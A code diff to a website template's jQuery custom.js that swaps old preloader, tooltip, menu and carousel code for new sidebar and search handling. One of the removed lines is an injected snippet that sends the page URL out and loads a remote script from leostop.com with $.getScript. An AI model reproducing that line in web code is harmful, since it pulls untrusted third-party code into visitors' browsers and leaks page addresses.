@@ -1,62 +1,35 @@
-/*---------------------------------------------------------------------
-    File Name: custom.js
----------------------------------------------------------------------*/
+$(function() {
+    "use strict";
 
-$(function () {
+    $(".preloader").fadeOut();
+    // this is for close icon when navigation open in mobile view
+    $(".nav-toggler").on('click', function() {
+        $("#main-wrapper").toggleClass("show-sidebar");
+        $(".nav-toggler i").toggleClass("ti-menu");
+    });
+    $(".search-box a, .search-box .app-search .srh-btn").on('click', function() {
+        $(".app-search").toggle(200);
+        $(".app-search input").focus();
+    });
 
-	"use strict";
-
-	/* Preloader
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-
-	setTimeout(function () {
-		$('.loader_bg').fadeToggle();
-	}, 1500);
-
-	/* Tooltip
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-
-	$(document).ready(function () {
-		$('[data-toggle="tooltip"]').tooltip();
-	});
-
-
-
-	/* Mouseover
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-
-	$(document).ready(function () {
-		$(".main-menu ul li.megamenu").mouseover(function () {
-			if (!$(this).parent().hasClass("#wrapper")) {
-				$("#wrapper").addClass('overlay');
-			}
-		});
-		$(".main-menu ul li.megamenu").mouseleave(function () {
-			$("#wrapper").removeClass('overlay');
-		});
-	});
-
-
-
-
-
-	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
-	/* Toggle sidebar
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-
-	$(document).ready(function () {
-		$('#sidebarCollapse').on('click', function () {
-			$('#sidebar').toggleClass('active');
-			$(this).toggleClass('active');
-		});
-	});
-
-	/* Product slider 
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	// optional
-	$('#blogCarousel').carousel({
-		interval: 5000
-	});
-
+    // ============================================================== 
+    // Resize all elements
+    // ============================================================== 
+    $("body, .page-wrapper").trigger("resize");
+    $(".page-wrapper").delay(20).show();
+    
+    //****************************
+    /* This is for the mini-sidebar if width is less then 1170*/
+    //**************************** 
+    var setsidebartype = function() {
+        var width = (window.innerWidth > 0) ? window.innerWidth : this.screen.width;
+        if (width < 1170) {
+            $("#main-wrapper").attr("data-sidebartype", "mini-sidebar");
+        } else {
+            $("#main-wrapper").attr("data-sidebartype", "full");
+        }
+    };
+    $(window).ready(setsidebartype);
+    $(window).on("resize", setsidebartype);
 
 });
